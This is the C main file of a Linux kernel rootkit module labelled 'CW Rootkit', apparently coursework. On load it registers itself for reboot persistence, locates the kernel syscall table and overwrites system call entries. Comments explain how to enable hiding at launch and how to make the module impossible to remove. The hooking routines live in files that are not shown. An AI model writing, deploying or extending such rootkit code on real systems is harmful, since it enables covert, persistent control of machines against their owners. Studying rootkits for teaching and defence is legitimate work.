#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/syscalls.h>
#include <linux/cred.h>

#include "rootkit_main.h"
#include "modify_syscalls.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Finn_Adam_Charlie");
MODULE_DESCRIPTION("CW Rootkit");
MODULE_VERSION("0.0.1");

void **sys_call_table;
struct sysinfo *info;

static int __init lkm_example_init(void) {
    printk(KERN_INFO "Hello, World!\n");

    add_to_reboot();

    sys_call_table = find_syscall_table();
    pr_info("Found sys_call_table at %p\n", sys_call_table);

    update_sys_calls(sys_call_table);

    //TODO uncomment to hide the rootkit on launch
    //hide();
    return 0;
}

static void __exit lkm_example_exit(void) {
    printk(KERN_INFO "Goodbye, World!\n");

    revert_to_original(sys_call_table);
}



module_init(lkm_example_init);
//TODO Comment this line out to make it so the rootkit can't be removed
module_exit(lkm_example_exit);
